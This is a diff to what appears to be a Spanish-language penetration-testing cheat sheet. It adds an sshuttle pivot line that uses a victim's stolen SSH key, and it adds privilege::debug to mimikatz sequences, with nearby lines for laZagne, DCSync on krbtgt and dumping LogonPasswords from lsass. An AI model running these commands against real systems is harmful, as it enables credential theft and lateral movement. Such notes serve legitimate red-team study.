@@ -1524,6 +1524,7 @@ with id_rsa
 
 ```c
 sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
+sshuttle -vr user@IP_VICITMA RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa' //desde maquina atacante a maquina victima de donde la id_rsa
 ```
 
 ```c
@@ -5030,6 +5031,7 @@ laZagne.exe all
 ##### Common Commands
 
 ```c
+privilege::debug
 token::elevate
 token::revert
 vault::cred
@@ -5044,6 +5046,7 @@ lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 
 ```c
 .\mimikatz.exe
+privilege::debug
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
 meterpreter > getprivs
